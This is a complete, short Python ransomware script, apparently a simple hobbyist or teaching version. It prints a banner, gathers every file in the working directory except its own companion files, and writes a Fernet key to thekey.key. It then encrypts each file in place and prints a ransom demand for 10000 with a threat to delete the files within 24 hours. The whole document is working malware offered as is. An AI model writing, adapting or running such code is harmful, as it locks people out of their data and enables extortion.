import os
from cryptography.fernet import Fernet

# Read and print contents of banner.txt
with open("banner.txt", "r") as banner_file:
    banner_content = banner_file.read()
    print(banner_content)

#lets find some files

files = []

for file in os.listdir():
        if file == "ransomware.py" or file == "thekey.key" or file == "decrypt.py" or file == "banner.txt":
                continue
        if os.path.isfile(file):
                files.append(file)
print(files)


key = Fernet.generate_key()

with open("thekey.key","wb") as thekey:
        thekey.write(key)

for file in files:
        with open(file, "rb") as thefile:
                contents = thefile.read()
        contents_encrypted = Fernet(key).encrypt(contents)
        with open(file,"wb") as thefile:
                thefile.write(contents_encrypted)

print("All of your files are encrypted!! Send Me 10000 or I'll delete all the files in 24hrs")
